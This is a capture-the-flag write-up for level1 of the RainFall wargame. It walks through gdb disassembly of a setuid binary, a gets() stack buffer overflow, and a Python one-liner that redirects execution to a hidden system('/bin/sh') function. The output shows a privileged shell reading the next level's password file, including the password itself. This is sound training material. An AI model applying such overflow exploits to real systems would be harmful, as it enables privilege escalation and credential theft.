# Rainfall

## Level1

```sh
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

```sh
level1@RainFall:~$ ./level1 
   
level1@RainFall:~$ 
```
The program is waiting indefinitely and waiting for user input

```sh
level1@RainFall:~$ ./level1 
hello
level1@RainFall:~$ 
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   # Setting up and align stack

   0x08048486 <+6>:     sub    $0x50,%esp
   # Reserve 0x50 bytes (80 in decimal) on the stack
   
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   # Compute the address of a local buffer at esp + 0x10 (16 in decimal)
   # Since 0x50 bytes (80) are allocated for local variables on the stack
   # 0x50 - 0x10 = 0x40, the buffer likely takes up the remaining space
   # So the buffer size is 64 bytes (0x40)

   0x0804848d <+13>:    mov    %eax,(%esp)
   # Move the buffer to the top of the stack to prepare it as an argument for the upcoming function call
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   # gets(buffer)

   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret    
End of assembler dump.
```

Let's see if there is something more in this program

```sh
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run # <-------- target function
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp) # <------ string passed as an arg to system
   0x08048479 <+53>:    call   0x8048360 <system@plt> # <---------- system call
   0x0804847e <+58>:    leave  
   0x0804847f <+59>:    ret    
End of assembler dump.
(gdb) 
```
```sh
(gdb) x/s 0x8048584 # <----- printing the value of the string passed as an arg to system
0x8048584:       "/bin/sh"
```

Perfect we found our target, in order to exploit this binary we can exploit gets which is not protected in order to do a buffer overflow and replace the value located at EBP + 4 which will be written in the EIP register when we reach the ret instruction

In order to do this we can use different method such as using a cyclic pattern and then check the EIP register value when the program crashed in order to retrieve number of bytes between the buffer address and EBP + 4

But we can also just put a breakpoint before the gets function call, retrieve the address stored in the eax register (buffer address) and check the difference between the buffer address and ebp

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret    
End of assembler dump.
(gdb) b *0x08048490
Breakpoint 1 at 0x8048490
(gdb) run
Starting program: /home/user/level1/level1 

Breakpoint 1, 0x08048490 in main ()
(gdb) p $ebp - $eax
$1 = (void *) 0x48 # 72 in decimal
```

We need to write 72 padding character in the buffer to reach EBP, then 4 more padding characters to reach EBP + 4 were we will store the future EIP value (used in ret instruction) and finally our target address

```sh
level1@RainFall:~$ (python -c 'print "A"*0x48 + "BBBB" + "\x44\x84\x04\x08"' ; cat) | ./level1 
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```